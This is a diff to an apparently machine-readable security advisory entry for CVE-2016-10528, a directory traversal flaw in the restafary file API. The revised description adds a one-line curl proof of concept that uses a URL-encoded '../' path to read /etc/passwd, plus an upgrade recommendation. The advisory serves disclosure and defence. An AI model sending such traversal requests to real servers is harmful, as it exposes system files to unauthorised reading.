@@ -27,12 +27,12 @@
         "Value": "CVE-2016-10528"
       }
     ],
-    "Description": "restafary is a REpresentful State Transfer API for Creating, Reading, Using, Deleting files on a server from the web. Restafary before 1.6.1 is able to set up a root path, which should only allow it to run inside of that root path it specified.",
+    "Description": "Affected versions of `restafary` are susceptible to a directory traversal vulnerability when a root path is specified in the configuration.\n\n\nProof of Concept\n\n```\ncurl -i -s -k  -X 'GET' -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' 'http://localhost:8000/api/v1/fs/..%2f..%2fetc/passwd'\n```\n\n\n## Recommendation\n\nUpdate to version 1.6.1 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2019-02-18T23:39:22Z",
     "Severity": "MODERATE",
-    "Summary": "Moderate severity vulnerability that affects restafary",
-    "UpdatedAt": "2019-07-03T21:02:06Z",
+    "Summary": "Directory Traversal in restafary",
+    "UpdatedAt": "2020-08-31T18:10:26Z",
     "WithdrawnAt": ""
   },
   "Versions": [
